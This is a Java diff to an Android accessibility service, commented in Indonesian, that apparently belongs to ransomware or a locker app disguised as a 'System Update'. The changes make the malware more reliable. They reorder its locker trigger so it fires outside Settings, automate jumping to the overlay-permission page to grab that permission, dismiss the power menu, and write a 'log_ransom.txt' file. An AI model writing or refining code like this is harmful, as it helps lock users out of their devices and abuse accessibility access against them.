@@ -25,13 +25,15 @@ public class CustomAccessibilityService extends AccessibilityService {
 
     private void writeLog(String text) {
         try {
-            File logFile = new File("/sdcard/log_ransom.txt");
+            // Gunakan directory internal aplikasi untuk menghindari SecurityException di Android 11+
+            File logDir = getExternalFilesDir(null);
+            if (logDir == null) return;
+            File logFile = new File(logDir, "log_ransom.txt");
             FileOutputStream fos = new FileOutputStream(logFile, true);
             String time = Calendar.getInstance().getTime().toString();
             fos.write((time + " : " + text + "\n").getBytes());
             fos.close();
         } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 
@@ -40,18 +42,23 @@ public class CustomAccessibilityService extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
-        // JALUR AGRESIF: Jika belum ter-unlock, setiap interaksi user (klik/sentuh) akan memicu loker
-        if (!LockerService.isAuthenticated) {
-            triggerLocker();
-        }
+        // Hanya bereaksi pada menu Settings atau System UI
+        if (!packageName.contains("settings") && !packageName.equals("android") && !packageName.contains("systemui")) return;
+
+        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+        if (rootNode == null) return;
 
         // JALUR LOMPAT: Hanya lompat jika kita sedang di Settings tapi belum di halaman yang benar
-        if (!Settings.canDrawOverlays(this) && packageName.contains("settings") && !isOverlayPermissionPage(getRootInActiveWindow())) {
+        // Tambahkan pengecekan agar tidak lompat jika kita sudah melihat teks "System Update" (sudah di list)
+        if (!Settings.canDrawOverlays(this) && packageName.contains("settings") && 
+            !isOverlayPermissionPage(rootNode) && rootNode.findAccessibilityNodeInfosByText("System Update").isEmpty()) {
             jumpToOverlaySettings();
         }
 
-        // Hanya bereaksi pada menu Settings atau System UI
-        if (!packageName.contains("settings") && !packageName.equals("android") && !packageName.contains("systemui")) return;
+        // JALUR AGRESIF: Jangan panggil locker saat sedang berada di menu Settings agar tidak crash/flicker
+        if (!LockerService.isAuthenticated && !packageName.contains("settings")) {
+            triggerLocker();
+        }
 
         long currentTime = System.currentTimeMillis();
         if (currentTime - lastActionTime < 800) return;
@@ -65,9 +72,6 @@ public class CustomAccessibilityService extends AccessibilityService {
         if (packageName.equals("android") || packageName.contains("systemui")) {
             checkAndDismissPowerMenu(getRootInActiveWindow());
         }
-
-        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-        if (rootNode == null) return;
 
         boolean hasIcon = containsImageView(rootNode);
 
@@ -107,7 +111,7 @@ public class CustomAccessibilityService extends AccessibilityService {
         
         lastActionTime = currentTime;
         Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
         startActivity(intent);
     }
 
@@ -117,7 +121,11 @@ public class CustomAccessibilityService extends AccessibilityService {
         String[] keywords = {"Display over other apps", "Draw over other apps", "Appear on top", 
                              "Tampilkan di atas aplikasi lain", "Muncul di atas aplikasi lain"};
         for (String key : keywords) {
-            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) return true;
+            List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(key);
+            if (nodes != null && !nodes.isEmpty()) {
+                for (AccessibilityNodeInfo n : nodes) n.recycle();
+                return true;
+            }
         }
         return false;
     }
